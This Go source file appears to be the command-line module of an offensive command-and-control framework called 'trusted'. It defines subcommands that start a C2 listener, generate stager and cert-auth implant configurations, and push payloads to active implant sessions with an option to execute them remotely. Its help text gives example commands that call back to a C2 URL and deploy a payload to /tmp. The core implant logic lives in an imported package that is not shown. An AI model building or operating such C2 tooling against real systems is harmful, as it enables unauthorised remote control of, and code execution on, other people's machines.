package main

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/loudmumble/trusted/pkg/c2"
	"github.com/spf13/cobra"
)

var c2Cmd = &cobra.Command{
	Use:   "c2 {start|stager|implant|deploy|console}",
	Short: "Command and Control",
	Long: `C2 listener management, stager/implant generation, file deploy, and operator console.

Examples:
  trusted c2 start -b 0.0.0.0 -p 8443
  ted c2 stager --url https://c2.example.com:8443 -o stager.json
  ted c2 implant cert-auth -U admin@corp.local --url https://c2.e.com
  ted c2 deploy -s <ID> -f ./payload -p /tmp/svc --execute
  ted c2 console --url http://localhost:8080`,
	RunE: func(cmd *cobra.Command, args []string) error {
		return cmd.Help()
	},
}

// c2 start — run the C2 listener
var c2StartCmd = &cobra.Command{
	Use:   "start",
	Short: "Start HTTP/HTTPS C2 listener",
	RunE: func(cmd *cobra.Command, args []string) error {
		bind, _ := cmd.Flags().GetString("bind")
		port, _ := cmd.Flags().GetInt("port")
		protocol, _ := cmd.Flags().GetString("protocol")
		certFile, _ := cmd.Flags().GetString("cert")
		keyFile, _ := cmd.Flags().GetString("key")

		if bind == "" {
			bind = "0.0.0.0"
		}
		if port == 0 {
			port = 8080
		}
		if protocol == "" {
			protocol = "http"
		}

		listener := &c2.Listener{
			BindAddress: bind,
			Port:        port,
			Protocol:    protocol,
			CertFile:    certFile,
			KeyFile:     keyFile,
		}

		return listener.Start()
	},
}

// c2 stager — generate stager config
var c2StagerCmd = &cobra.Command{
	Use:   "stager",
	Short: "Generate stager configuration file",
	RunE: func(cmd *cobra.Command, args []string) error {
		output, _ := cmd.Flags().GetString("output")
		c2URL, _ := cmd.Flags().GetString("url")

		if c2URL == "" {
			return fmt.Errorf("--url is required for stager generation")
		}
		if output == "" {
			output = "stager.json"
		}

		stager, err := c2.GenerateStagerConfig(c2URL)
		if err != nil {
			return fmt.Errorf("generate stager config: %w", err)
		}
		data, err := json.MarshalIndent(stager, "", "  ")
		if err != nil {
			return fmt.Errorf("marshal stager config: %w", err)
		}

		if err := os.WriteFile(output, data, 0600); err != nil {
			return fmt.Errorf("write stager: %w", err)
		}

		fmt.Printf("[+] Stager configuration written to %s\n", output)
		fmt.Printf("    C2 URL: %s\n", c2URL)
		fmt.Printf("    Stager ID: %s\n", stager.ID)
		return nil
	},
}

// c2 implant <type> — generate implant config
var c2ImplantCmd = &cobra.Command{
	Use:   "implant <type>",
	Short: "Generate implant configuration (cert-auth)",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		implantType := args[0]
		c2URL, _ := cmd.Flags().GetString("url")
		upn, _ := cmd.Flags().GetString("upn")
		output, _ := cmd.Flags().GetString("output")

		if c2URL == "" {
			return fmt.Errorf("--url is required")
		}

		switch implantType {
		case "cert-auth":
			if upn == "" {
				return fmt.Errorf("-U (UPN) is required for cert-auth implant")
			}
			if output == "" {
				output = "./cert-auth-implant"
			}
			_, err := c2.GenerateCertAuthImplant(c2URL, upn, output)
			return err
		default:
			return fmt.Errorf("unknown implant type: %s (supported: cert-auth)", implantType)
		}
	},
}

// c2 deploy — deploy file to active C2 session
var c2DeployCmd = &cobra.Command{
	Use:   "deploy",
	Short: "Deploy a file to an active C2 session",
	Long: `Upload a binary or file to an active implant session via the C2 listener.

Examples:
  trusted c2 deploy --url http://localhost:8080 -s <ID> -f ./payload -p /tmp/svc --execute`,
	RunE: func(cmd *cobra.Command, args []string) error {
		c2URL, _ := cmd.Flags().GetString("url")
		sessionID, _ := cmd.Flags().GetString("session")
		filePath, _ := cmd.Flags().GetString("file")
		remotePath, _ := cmd.Flags().GetString("path")
		execute, _ := cmd.Flags().GetBool("execute")

		if c2URL == "" || sessionID == "" || filePath == "" || remotePath == "" {
			return fmt.Errorf("--url, -s (session), -f (file), and -p (path) are all required")
		}

		return runDeploy(c2URL, sessionID, filePath, remotePath, execute)
	},
}

// c2 console — launch TUI operator console
var c2ConsoleCmd = &cobra.Command{
	Use:   "console",
	Short: "Launch the operator console TUI",
	RunE: func(cmd *cobra.Command, args []string) error {
		c2URL, _ := cmd.Flags().GetString("url")
		return runConsole(c2URL)
	},
}

func init() {
	rootCmd.AddCommand(c2Cmd)

	c2Cmd.AddCommand(c2StartCmd)
	c2Cmd.AddCommand(c2StagerCmd)
	c2Cmd.AddCommand(c2ImplantCmd)
	c2Cmd.AddCommand(c2DeployCmd)
	c2Cmd.AddCommand(c2ConsoleCmd)

	// start flags
	c2StartCmd.Flags().StringP("bind", "b", "0.0.0.0", "Bind address")
	c2StartCmd.Flags().IntP("port", "p", 8080, "Port")
	c2StartCmd.Flags().String("protocol", "http", "Protocol: http or https")
	c2StartCmd.Flags().String("cert", "", "TLS cert file (HTTPS)")
	c2StartCmd.Flags().String("key", "", "TLS key file (HTTPS)")

	// stager flags
	c2StagerCmd.Flags().StringP("url", "", "", "C2 callback URL")
	c2StagerCmd.Flags().StringP("output", "o", "stager.json", "Output path")

	// implant flags
	c2ImplantCmd.Flags().StringP("url", "", "", "C2 callback URL")
	c2ImplantCmd.Flags().StringP("upn", "U", "", "UPN for cert-auth implant")
	c2ImplantCmd.Flags().StringP("output", "o", "", "Output directory")

	// deploy flags
	c2DeployCmd.Flags().StringP("url", "", "http://localhost:8080", "C2 listener URL")
	c2DeployCmd.Flags().StringP("session", "s", "", "Target session ID")
	c2DeployCmd.Flags().StringP("file", "f", "", "Local file to deploy")
	c2DeployCmd.Flags().StringP("path", "p", "", "Remote path to write file")
	c2DeployCmd.Flags().Bool("execute", false, "Execute file after delivery")

	// console flags
	c2ConsoleCmd.Flags().StringP("url", "", "http://localhost:8080", "C2 listener URL")
}
